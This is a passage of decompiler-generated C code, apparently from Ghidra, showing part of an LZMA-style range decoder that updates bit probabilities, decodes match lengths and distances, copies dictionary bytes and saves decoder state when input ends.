      uVar5 = *(ushort *)(lVar23 + 0x6180);
      uVar27 = (uVar28 >> 0xb) * (uint)uVar5;
      if (uVar39 < uVar27) {
        uVar28 = 0x800 - uVar5 >> 5;
        *(ushort *)(lVar23 + 0x6180) = uVar5 + (short)uVar28;
        puVar44 = (ushort *)(ulong)uVar28;
        uVar28 = uVar27;
        uVar33 = local_ac;
        local_78 = uVar14;
        if ((uint)uVar49 < 7) {
          uVar49 = 7;
        }
        else {
          uVar49 = 10;
        }
LAB_0011dc17:
        local_ac = uVar15;
        if (uVar28 < 0x1000000) {
          if (pbVar1 == pbVar41) {
            *(undefined4 *)(param_1 + 0x6ea4) = 6;
            uVar18 = store_encoding_state
                               (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                (long)pbVar1 - param_3);
            return uVar18;
          }
          bVar4 = *pbVar41;
          uVar28 = uVar28 << 8;
          pbVar41 = pbVar41 + 1;
          uVar39 = uVar39 << 8 | (uint)bVar4;
        }
        uVar5 = *(ushort *)(param_1 + 0x6664);
        uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
        if (uVar39 < uVar14) {
          uVar43 = uVar43 * 0x10;
          uVar18 = 1;
          uVar29 = 2;
          lVar36 = param_1 + 0x6668 + uVar43;
          local_a4 = 8;
          *(ushort *)(param_1 + 0x6664) = uVar5 + (short)(0x800 - uVar5 >> 5);
          puVar44 = (ushort *)(ulong)uVar5;
          uVar28 = uVar14;
        }
        else {
          uVar28 = uVar28 - uVar14;
          uVar39 = uVar39 - uVar14;
          *(ushort *)(param_1 + 0x6664) = uVar5 - (uVar5 >> 5);
          puVar44 = (ushort *)(ulong)uVar5;
LAB_0011deb0:
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 7;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          uVar5 = *(ushort *)(param_1 + 0x6666);
          uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
          puVar44 = (ushort *)(ulong)uVar5;
          if (uVar39 < uVar14) {
            uVar43 = uVar43 * 0x10;
            uVar29 = 10;
            local_a4 = 8;
            lVar36 = param_1 + 0x6768 + uVar43;
            uVar18 = 1;
            *(ushort *)(param_1 + 0x6666) = uVar5 + (short)(0x800 - uVar5 >> 5);
            uVar28 = uVar14;
          }
          else {
            uVar28 = uVar28 - uVar14;
            uVar39 = uVar39 - uVar14;
            uVar29 = 0x12;
            local_a4 = 0x100;
            lVar36 = param_1 + 0x6868;
            uVar18 = 1;
            *(ushort *)(param_1 + 0x6666) = uVar5 - (uVar5 >> 5);
          }
        }
LAB_0011dcc9:
        do {
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 8;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3,lVar36,param_4);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          uVar14 = (int)uVar18 * 2;
          puVar35 = (ushort *)(lVar36 + uVar18 * 2);
          uVar5 = *puVar35;
          puVar44 = (ushort *)(ulong)uVar5;
          uVar27 = (uint)uVar5;
          uVar15 = (uVar28 >> 0xb) * uVar27;
          if (uVar39 < uVar15) {
            uVar16 = 0x800 - uVar27 >> 5;
            puVar44 = (ushort *)(ulong)uVar16;
            uVar28 = uVar15;
          }
          else {
            uVar39 = uVar39 - uVar15;
            uVar14 = uVar14 + 1;
            uVar16 = -(uint)(uVar5 >> 5);
            uVar28 = uVar28 - uVar15;
          }
          uVar18 = (ulong)uVar14;
          uVar43 = (ulong)(uVar27 + uVar16);
          *puVar35 = (ushort)(uVar27 + uVar16);
        } while (uVar14 < local_a4);
        uVar43 = (ulong)(uVar29 - local_a4);
        uVar14 = (uVar29 - local_a4) + uVar14;
        uVar18 = 1;
        uVar47 = (ulong)uVar14;
        uVar15 = 5;
        if (uVar14 < 6) {
          uVar15 = uVar14;
        }
        lVar36 = param_1 + 0x6360 + (ulong)(uVar15 - 2) * 0x80;
        puVar44 = (ushort *)(ulong)uVar14;
LAB_0011e29a:
        do {
          uVar14 = uVar28;
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 9;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3,lVar36,param_4);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar14 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          uVar27 = (int)uVar18 * 2;
          puVar35 = (ushort *)(lVar36 + uVar18 * 2);
          uVar5 = *puVar35;
          puVar44 = (ushort *)(ulong)uVar5;
          uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
          uVar43 = (ulong)uVar28;
          if (uVar39 < uVar28) {
            uVar14 = 0x800 - uVar5 >> 5;
            puVar44 = (ushort *)(ulong)uVar14;
            sVar11 = (short)uVar14;
          }
          else {
            uVar39 = uVar39 - uVar28;
            uVar27 = uVar27 + 1;
            uVar43 = (ulong)(uVar5 >> 5);
            sVar11 = -(uVar5 >> 5);
            uVar28 = uVar14 - uVar28;
          }
          uVar18 = (ulong)uVar27;
          *puVar35 = uVar5 + sVar11;
        } while (uVar27 < 0x40);
        uVar27 = uVar27 - 0x40;
        uVar15 = uVar27;
        if (3 < uVar27) {
          uVar15 = (uVar27 & 1) + 2;
          if (uVar27 < 0xe) {
            local_a4 = (uVar27 >> 1) - 1;
            uVar38 = 0;
            uVar18 = 1;
            uVar15 = uVar15 << ((byte)local_a4 & 0x1f);
            uVar43 = (ulong)uVar15 - (ulong)uVar27;
            lVar36 = param_1 + 0x655e + uVar43 * 2;
LAB_0011e20c:
            do {
              uVar14 = uVar28;
              if (uVar28 < 0x1000000) {
                if (pbVar1 == pbVar41) {
                  *(undefined4 *)(param_1 + 0x6ea4) = 10;
                  uVar18 = store_encoding_state
                                     (0x800,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                      (long)pbVar1 - param_3,lVar36,param_4);
                  return uVar18;
                }
                bVar4 = *pbVar41;
                uVar14 = uVar28 << 8;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 << 8 | (uint)bVar4;
              }
              uVar27 = (int)uVar18 * 2;
              puVar44 = (ushort *)(lVar36 + uVar18 * 2);
              uVar5 = *puVar44;
              uVar29 = (uint)uVar5;
              uVar28 = (uVar14 >> 0xb) * uVar29;
              if (uVar39 < uVar28) {
                uVar16 = 0x800 - uVar29 >> 5;
              }
              else {
                uVar39 = uVar39 - uVar28;
                uVar27 = uVar27 + 1;
                uVar16 = -(uint)(uVar5 >> 5);
                uVar15 = uVar15 + (1 << ((byte)uVar38 & 0x1f));
                uVar28 = uVar14 - uVar28;
              }
              uVar18 = (ulong)uVar27;
              uVar43 = (ulong)(uVar29 + uVar16);
              uVar38 = uVar38 + 1;
              *puVar44 = (ushort)(uVar29 + uVar16);
            } while (uVar38 < local_a4);
          }
          else {
            local_a4 = (uVar27 >> 1) - 5;
            puVar44 = (ushort *)(ulong)uVar27;
LAB_0011e0d8:
            do {
              if (uVar28 < 0x1000000) {
                if (pbVar1 == pbVar41) {
                  *(undefined4 *)(param_1 + 0x6ea4) = 0xb;
                  uVar18 = store_encoding_state
                                     (puVar44,*(undefined8 *)(param_1 + 0x6e98),local_a4,
                                      (long)pbVar1 - param_3);
                  return uVar18;
                }
                bVar4 = *pbVar41;
                uVar28 = uVar28 << 8;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 << 8 | (uint)bVar4;
              }
              uVar28 = uVar28 >> 1;
              uVar14 = (int)(uVar39 - uVar28) >> 0x1f;
              uVar15 = uVar14 + 1 + uVar15 * 2;
              uVar39 = (uVar39 - uVar28) + (uVar28 & uVar14);
              local_a4 = local_a4 - 1;
              puVar44 = (ushort *)(ulong)uVar14;
            } while (local_a4 != 0);
            uVar15 = uVar15 * 0x10;
            uVar18 = 0;
            uVar38 = 1;
            local_a4 = 0;
            uVar43 = 0;
LAB_0011e12c:
            uVar29 = (uint)uVar47;
            uVar27 = (uint)uVar49;
            do {
              uVar14 = uVar28;
              if (uVar28 < 0x1000000) {
                if (pbVar1 == pbVar41) {
                  *(undefined4 *)(param_1 + 0x6ea4) = 0xc;
                  uVar18 = store_encoding_state
                                     (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                      (long)pbVar1 - param_3,lVar36);
                  return uVar18;
                }
                bVar4 = *pbVar41;
                uVar14 = uVar28 << 8;
                pbVar41 = pbVar41 + 1;
                uVar39 = uVar39 << 8 | (uint)bVar4;
              }
              uVar16 = (int)uVar18 + uVar38;
              lVar23 = param_1 + (ulong)uVar16 * 2;
              uVar5 = *(ushort *)(lVar23 + 0x6644);
              puVar44 = (ushort *)(ulong)uVar5;
              uVar40 = (uint)uVar5;
              uVar28 = (uVar14 >> 0xb) * uVar40;
              if (uVar39 < uVar28) {
                uVar16 = 0x800 - uVar40 >> 5;
              }
              else {
                uVar39 = uVar39 - uVar28;
                uVar18 = (ulong)uVar16;
                uVar16 = -(uint)(uVar5 >> 5);
                uVar28 = uVar14 - uVar28;
              }
              uVar43 = (ulong)(uVar40 + uVar16);
              uVar14 = (uint)uVar18;
              uVar38 = uVar38 * 2;
              *(short *)(lVar23 + 0x6644) = (short)(uVar40 + uVar16);
            } while (uVar38 < 0x10);
            uVar15 = uVar15 + uVar14;
            uVar16 = local_ac;
            uVar40 = uVar33;
            if (uVar15 == 0xffffffff) {
LAB_00120013:
              local_ac = uVar16;
              uVar15 = 0xffffffff;
              uVar34 = *(ulong *)(param_1 + 0x6e98);
              uVar33 = uVar40;
              if (local_61 == '\0') {
                uVar18 = store_encoding_state();
                return uVar18;
              }
              goto LAB_0011e2f2;
            }
          }
        }
        puVar44 = (ushort *)(ulong)uVar15;
        if (puVar22 <= puVar44) {
LAB_0011fbba:
          uVar18 = store_encoding_state();
          return uVar18;
        }
      }
      else {
        uVar28 = uVar28 - uVar27;
        uVar39 = uVar39 - uVar27;
        *(ushort *)(lVar23 + 0x6180) = uVar5 - (uVar5 >> 5);
        puVar44 = (ushort *)(ulong)uVar5;
        uVar33 = uVar14;
        if (puVar22 == (ushort *)0x0) goto LAB_0011fbba;
LAB_0011e418:
        if (uVar28 < 0x1000000) {
          if (pbVar1 == pbVar41) {
            *(undefined4 *)(param_1 + 0x6ea4) = 0xe;
            uVar18 = store_encoding_state
                               (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                (long)pbVar1 - param_3);
            return uVar18;
          }
          bVar4 = *pbVar41;
          uVar28 = uVar28 << 8;
          pbVar41 = pbVar41 + 1;
          uVar39 = uVar39 << 8 | (uint)bVar4;
        }
        lVar23 = param_1 + (uVar49 & 0xffffffff) * 2;
        uVar5 = *(ushort *)(lVar23 + 0x6198);
        uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
        if (uVar39 < uVar14) {
          *(ushort *)(lVar23 + 0x6198) = uVar5 + (short)(0x800 - uVar5 >> 5);
          puVar44 = local_70;
          uVar28 = uVar14;
LAB_0011e47a:
          uVar27 = (uint)uVar49;
          uVar14 = uVar28;
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 0x10;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar14 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          lVar23 = param_1 + ((uVar49 & 0xffffffff) * 0x10 + uVar43) * 2;
          uVar5 = *(ushort *)(lVar23 + 0x61e0);
          uVar28 = (uVar14 >> 0xb) * (uint)uVar5;
          if (uVar39 < uVar28) {
            *(ushort *)(lVar23 + 0x61e0) = uVar5 + (short)(0x800 - uVar5 >> 5);
            puVar35 = puVar22;
            if (uVar27 < 7) {
              uVar49 = 9;
            }
            else {
              uVar49 = 0xb;
            }
LAB_0011e4f7:
            puVar22 = (ushort *)(ulong)uVar15;
            lVar23 = lVar9 - 0x120;
            if (puVar22 < puVar44) {
              lVar23 = 0;
            }
            if (puVar44 == puVar46) {
              *(undefined4 *)(param_1 + 0x6ea4) = 0xf;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),puVar22,
                                  (long)pbVar41 - param_3);
              return uVar18;
            }
            *(undefined1 *)(lVar48 + (long)puVar44) =
                 *(undefined1 *)((long)puVar44 + lVar23 + lVar48 + (-1 - (long)puVar22));
            puVar37 = (ushort *)((long)puVar44 + 1);
            puVar22 = (ushort *)((long)puVar44 - 0x23f);
            if (cVar3 != '\0') {
              puVar22 = puVar35;
            }
            goto LAB_0011d4e3;
          }
          uVar39 = uVar39 - uVar28;
          *(ushort *)(lVar23 + 0x61e0) = uVar5 - (uVar5 >> 5);
          local_70 = puVar44;
          uVar28 = uVar14 - uVar28;
          uVar16 = local_ac;
        }
        else {
          uVar28 = uVar28 - uVar14;
          uVar39 = uVar39 - uVar14;
          *(ushort *)(lVar23 + 0x6198) = uVar5 - (uVar5 >> 5);
          puVar44 = (ushort *)(ulong)uVar5;
          uVar16 = uVar15;
LAB_0011e5fe:
          uVar27 = (uint)uVar49;
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 0x11;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          lVar23 = param_1 + (uVar49 & 0xffffffff) * 2;
          uVar5 = *(ushort *)(lVar23 + 0x61b0);
          uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
          if (uVar39 < uVar14) {
            puVar44 = (ushort *)(ulong)local_ac;
            *(ushort *)(lVar23 + 0x61b0) = uVar5 + (short)(0x800 - uVar5 >> 5);
            uVar28 = uVar14;
            uVar15 = local_ac;
          }
          else {
            uVar28 = uVar28 - uVar14;
            uVar39 = uVar39 - uVar14;
            *(ushort *)(lVar23 + 0x61b0) = uVar5 - (uVar5 >> 5);
            puVar44 = (ushort *)(ulong)uVar5;
            uVar14 = uVar33;
LAB_0011df31:
            uVar27 = (uint)uVar49;
            if (uVar28 < 0x1000000) {
              if (pbVar1 == pbVar41) {
                *(undefined4 *)(param_1 + 0x6ea4) = 0x12;
                uVar18 = store_encoding_state
                                   (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                    (long)pbVar1 - param_3);
                return uVar18;
              }
              bVar4 = *pbVar41;
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
              uVar39 = uVar39 << 8 | (uint)bVar4;
            }
            lVar23 = param_1 + (uVar49 & 0xffffffff) * 2;
            uVar5 = *(ushort *)(lVar23 + 0x61c8);
            uVar15 = (uVar28 >> 0xb) * (uint)uVar5;
            uVar33 = local_ac;
            if (uVar39 < uVar15) {
              *(ushort *)(lVar23 + 0x61c8) = uVar5 + (short)(0x800 - uVar5 >> 5);
              puVar44 = (ushort *)(ulong)local_ac;
              uVar28 = uVar15;
              uVar15 = uVar14;
            }
            else {
              uVar28 = uVar28 - uVar15;
              uVar39 = uVar39 - uVar15;
              *(ushort *)(lVar23 + 0x61c8) = uVar5 - (uVar5 >> 5);
              puVar44 = (ushort *)(ulong)local_ac;
              uVar15 = local_78;
              local_78 = uVar14;
            }
          }
        }
        local_ac = uVar16;
        uVar49 = (ulong)((-(uint)(uVar27 < 7) & 0xfffffffd) + 0xb);
LAB_0011dfb9:
        if (uVar28 < 0x1000000) {
          if (pbVar1 == pbVar41) {
            *(undefined4 *)(param_1 + 0x6ea4) = 0x13;
            uVar18 = store_encoding_state
                               (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                (long)pbVar1 - param_3);
            return uVar18;
          }
          bVar4 = *pbVar41;
          uVar28 = uVar28 << 8;
          pbVar41 = pbVar41 + 1;
          uVar39 = uVar39 << 8 | (uint)bVar4;
        }
        uVar5 = *(ushort *)(param_1 + 0x6a68);
        uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
        if (uVar39 < uVar14) {
          uVar43 = uVar43 * 0x10;
          uVar18 = 1;
          uVar29 = 2;
          lVar36 = param_1 + 0x6a6c + uVar43;
          local_a4 = 8;
          *(ushort *)(param_1 + 0x6a68) = uVar5 + (short)(0x800 - uVar5 >> 5);
          puVar44 = (ushort *)(ulong)uVar5;
          uVar28 = uVar14;
        }
        else {
          uVar28 = uVar28 - uVar14;
          uVar39 = uVar39 - uVar14;
          *(ushort *)(param_1 + 0x6a68) = uVar5 - (uVar5 >> 5);
          puVar44 = (ushort *)(ulong)uVar5;
LAB_0011e569:
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 0x14;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          uVar5 = *(ushort *)(param_1 + 0x6a6a);
          uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
          puVar44 = (ushort *)(ulong)uVar5;
          if (uVar39 < uVar14) {
            uVar43 = uVar43 * 0x10;
            uVar29 = 10;
            local_a4 = 8;
            lVar36 = param_1 + 0x6b6c + uVar43;
            uVar18 = 1;
            *(ushort *)(param_1 + 0x6a6a) = uVar5 + (short)(0x800 - uVar5 >> 5);
            uVar28 = uVar14;
          }
          else {
            uVar28 = uVar28 - uVar14;
            uVar39 = uVar39 - uVar14;
            uVar29 = 0x12;
            local_a4 = 0x100;
            lVar36 = param_1 + 0x6c6c;
            uVar18 = 1;
            *(ushort *)(param_1 + 0x6a6a) = uVar5 - (uVar5 >> 5);
          }
        }
LAB_0011e069:
        do {
          if (uVar28 < 0x1000000) {
            if (pbVar1 == pbVar41) {
              *(undefined4 *)(param_1 + 0x6ea4) = 0x15;
              uVar18 = store_encoding_state
                                 (puVar44,*(undefined8 *)(param_1 + 0x6e98),uVar43,
                                  (long)pbVar1 - param_3,lVar36,param_4);
              return uVar18;
            }
            bVar4 = *pbVar41;
            uVar28 = uVar28 << 8;
            pbVar41 = pbVar41 + 1;
            uVar39 = uVar39 << 8 | (uint)bVar4;
          }
          uVar14 = (int)uVar18 * 2;
          puVar35 = (ushort *)(lVar36 + uVar18 * 2);
          uVar5 = *puVar35;
          puVar44 = (ushort *)(ulong)uVar5;
          uVar16 = (uint)uVar5;
          uVar27 = (uVar28 >> 0xb) * uVar16;
          if (uVar39 < uVar27) {
            uVar40 = 0x800 - uVar16 >> 5;
            puVar44 = (ushort *)(ulong)uVar40;
            uVar28 = uVar27;
          }
          else {
            uVar39 = uVar39 - uVar27;
            uVar14 = uVar14 + 1;
            uVar40 = -(uint)(uVar5 >> 5);
            uVar28 = uVar28 - uVar27;
          }
          uVar18 = (ulong)uVar14;
          uVar43 = (ulong)(uVar16 + uVar40);
          *puVar35 = (ushort)(uVar16 + uVar40);
        } while (uVar14 < local_a4);
        uVar47 = (ulong)((uVar29 - local_a4) + uVar14);
        puVar44 = (ushort *)(ulong)uVar15;
      }
LAB_0011d440:
      sVar26 = uVar47;
      if ((ulong)((long)puVar46 - (long)local_70) <= uVar47) {
        sVar26 = (long)puVar46 - (long)local_70;
      }
      lVar23 = (long)local_70 + (-1 - (long)puVar44);
      uVar14 = (uint)sVar26;
      uVar47 = (ulong)((int)uVar47 - uVar14);
      if (local_70 <= puVar44) {
        lVar23 = lVar23 - 0x120 + lVar9;
      }
      if (uVar15 < uVar14) {
        puVar21 = (undefined1 *)(lVar48 + lVar23);
        do {
          puVar20 = puVar21 + 1;
          *(undefined1 *)(((long)puVar21 - lVar23) + (long)local_70) = *puVar21;
          puVar21 = puVar20;
        } while ((undefined1 *)(lVar48 + 1 + (ulong)(uVar14 - 1) + lVar23) != puVar20);
        sVar26 = (ulong)(uVar14 - 1) + 1;
      }
      else {
        memcpy((void *)(lVar48 + (long)local_70),(void *)(lVar48 + lVar23),sVar26);
      }
      puVar37 = (ushort *)((long)local_70 + sVar26);
      puVar44 = puVar37 - 0x120;
      if (cVar3 != '\0') {
        puVar44 = puVar22;
      }
      puVar22 = puVar44;
      if ((int)uVar47 != 0) {
LAB_0011f72f:
        *(undefined4 *)(param_1 + 0x6ea4) = 0x16;
        uVar18 = store_encoding_state();
        return uVar18;
      }
    }
LAB_0011d4e3:
    uVar43 = (ulong)(uVar17 & (uint)puVar37);
    local_70 = puVar37;
    if (pbVar41 < pbVar19) {
      uVar29 = (uint)uVar47;
      lVar23 = lVar9 - 0x120;
      uVar27 = (uint)uVar49;
      do {
        puVar44 = local_70;
        if (local_70 == puVar46) break;
        if (uVar28 < 0x1000000) {
          bVar4 = *pbVar41;
          uVar28 = uVar28 << 8;
          pbVar41 = pbVar41 + 1;
          uVar39 = uVar39 << 8 | (uint)bVar4;
        }
        lVar24 = param_1 + ((ulong)uVar27 * 0x10 + uVar43) * 2;
        uVar5 = *(ushort *)(lVar24 + 0x6000);
        uVar14 = (uVar28 >> 0xb) * (uint)uVar5;
        if (uVar39 < uVar14) {
          *(ushort *)(lVar24 + 0x6000) = uVar5 + (short)(0x800 - uVar5 >> 5);
          lVar36 = param_1 + ((ulong)((uint)*(byte *)(lVar48 - 1 + (long)local_70) +
                                      (int)((long)local_70 << 8) & uVar7) << (local_68 & 0x3f)) * 6;
          if (uVar27 < 7) {
            if (uVar27 < 3) {
              uVar27 = 3;
            }
            uVar5 = *(ushort *)(lVar36 + 2);
            if (uVar14 < 0x1000000) {
              uVar39 = CONCAT31((int3)uVar39,*pbVar41);
              uVar14 = uVar14 * 0x100;
              pbVar41 = pbVar41 + 1;
            }
            uVar16 = (uVar14 >> 0xb) * (uint)uVar5;
            bVar45 = uVar39 < uVar16;
            uVar28 = uVar16;
            if (!bVar45) {
              uVar28 = uVar14 - uVar16;
            }
            uVar6 = *(ushort *)(lVar36 + 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 6);
            }
            uVar40 = (uint)uVar6;
            uVar14 = uVar5 - 0x7e1;
            if (!bVar45) {
              uVar14 = (uint)uVar5;
              uVar39 = uVar39 - uVar16;
            }
            uVar16 = 3 - bVar45;
            *(ushort *)(lVar36 + 2) = uVar5 - (short)(uVar14 >> 5);
            if (uVar28 < 0x1000000) {
              uVar39 = CONCAT31((int3)uVar39,*pbVar41);
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar30 = (uVar28 >> 0xb) * uVar40;
            bVar45 = uVar39 < uVar30;
            uVar14 = uVar30;
            if (!bVar45) {
              uVar14 = uVar28 - uVar30;
            }
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar16 * 4);
            if (!bVar45) {
              uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar16 * 4);
            }
            uVar31 = (uint)uVar5;
            uVar28 = uVar39 - uVar30;
            if (bVar45) {
              uVar28 = uVar39;
            }
            uVar39 = uVar40 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar40;
            }
            uVar40 = (uVar16 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar16 * 2)) = uVar6 - (short)(uVar39 >> 5);
            if (uVar14 < 0x1000000) {
              uVar28 = CONCAT31((int3)uVar28,*pbVar41);
              uVar14 = uVar14 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar16 = (uVar14 >> 0xb) * uVar31;
            bVar45 = uVar28 < uVar16;
            uVar39 = uVar16;
            if (!bVar45) {
              uVar39 = uVar14 - uVar16;
            }
            uVar6 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 2 + (ulong)uVar40 * 4);
            }
            uVar30 = (uint)uVar6;
            uVar14 = uVar28 - uVar16;
            if (bVar45) {
              uVar14 = uVar28;
            }
            uVar28 = uVar31 - 0x7e1;
            if (!bVar45) {
              uVar28 = uVar31;
            }
            uVar16 = (uVar40 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar5 - (short)(uVar28 >> 5);
            if (uVar39 < 0x1000000) {
              uVar14 = CONCAT31((int3)uVar14,*pbVar41);
              uVar39 = uVar39 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar40 = (uVar39 >> 0xb) * uVar30;
            bVar45 = uVar14 < uVar40;
            uVar28 = uVar40;
            if (!bVar45) {
              uVar28 = uVar39 - uVar40;
            }
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar16 * 4);
            if (!bVar45) {
              uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar16 * 4);
            }
            uVar31 = (uint)uVar5;
            uVar39 = uVar14 - uVar40;
            if (bVar45) {
              uVar39 = uVar14;
            }
            uVar14 = uVar30 - 0x7e1;
            if (!bVar45) {
              uVar14 = uVar30;
            }
            uVar40 = (uVar16 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar16 * 2)) = uVar6 - (short)(uVar14 >> 5);
            if (uVar28 < 0x1000000) {
              uVar39 = CONCAT31((int3)uVar39,*pbVar41);
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar16 = (uVar28 >> 0xb) * uVar31;
            bVar45 = uVar39 < uVar16;
            uVar14 = uVar16;
            if (!bVar45) {
              uVar14 = uVar28 - uVar16;
            }
            uVar6 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 2 + (ulong)uVar40 * 4);
            }
            uVar30 = (uint)uVar6;
            uVar28 = uVar39 - uVar16;
            if (bVar45) {
              uVar28 = uVar39;
            }
            uVar39 = uVar31 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar31;
            }
            uVar16 = (uVar40 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar5 - (short)(uVar39 >> 5);
            if (uVar14 < 0x1000000) {
              uVar28 = CONCAT31((int3)uVar28,*pbVar41);
              uVar14 = uVar14 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar40 = (uVar14 >> 0xb) * uVar30;
            bVar45 = uVar28 < uVar40;
            uVar39 = uVar40;
            if (!bVar45) {
              uVar39 = uVar14 - uVar40;
            }
            uVar5 = *(ushort *)(lVar36 + (ulong)uVar16 * 4);
            if (!bVar45) {
              uVar5 = *(ushort *)(lVar36 + 2 + (ulong)uVar16 * 4);
            }
            uVar31 = (uint)uVar5;
            uVar14 = uVar28 - uVar40;
            if (bVar45) {
              uVar14 = uVar28;
            }
            uVar28 = uVar30 - 0x7e1;
            if (!bVar45) {
              uVar28 = uVar30;
            }
            uVar40 = (uVar16 * 2 + 1) - (uint)bVar45;
            *(ushort *)(lVar36 + (ulong)(uVar16 * 2)) = uVar6 - (short)(uVar28 >> 5);
            if (uVar39 < 0x1000000) {
              uVar14 = CONCAT31((int3)uVar14,*pbVar41);
              uVar39 = uVar39 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar16 = (uVar39 >> 0xb) * uVar31;
            bVar45 = uVar14 < uVar16;
            uVar28 = uVar16;
            if (!bVar45) {
              uVar28 = uVar39 - uVar16;
            }
            uVar6 = *(ushort *)(lVar36 + (ulong)uVar40 * 4);
            if (!bVar45) {
              uVar6 = *(ushort *)(lVar36 + 2 + (ulong)uVar40 * 4);
            }
            uVar30 = (uint)uVar6;
            uVar16 = uVar14 - uVar16;
            if (bVar45) {
              uVar16 = uVar14;
            }
            uVar39 = uVar31 - 0x7e1;
            if (!bVar45) {
              uVar39 = uVar31;
            }
            *(ushort *)(lVar36 + (ulong)(uVar40 * 2)) = uVar5 - (short)(uVar39 >> 5);
            uVar14 = ((uVar40 * 2 + 1) - (uint)bVar45) * 2;
            if (uVar28 < 0x1000000) {
              uVar16 = CONCAT31((int3)uVar16,*pbVar41);
              uVar28 = uVar28 << 8;
              pbVar41 = pbVar41 + 1;
            }
            uVar40 = (uVar28 >> 0xb) * uVar30;
            uVar28 = uVar28 - uVar40;
            bVar45 = uVar16 < uVar40;
            uVar39 = uVar16 - uVar40;
            if (bVar45) {
              uVar39 = uVar16;
              uVar28 = uVar40;
            }
            uVar16 = uVar30 - 0x7e1;
            if (!bVar45) {
              uVar16 = uVar30;
            }
            cVar42 = ((char)uVar14 + '\x01') - bVar45;
            *(ushort *)(lVar36 + (ulong)uVar14) = uVar6 - (short)(uVar16 >> 5);
            uVar27 = uVar27 - 3;
          }
          else {
            uVar28 = uVar27 - 6;
            bVar45 = 9 < uVar27;
            uVar27 = uVar27 - 3;
            if (bVar45) {
              uVar27 = uVar28;
            }
            lVar24 = 0;
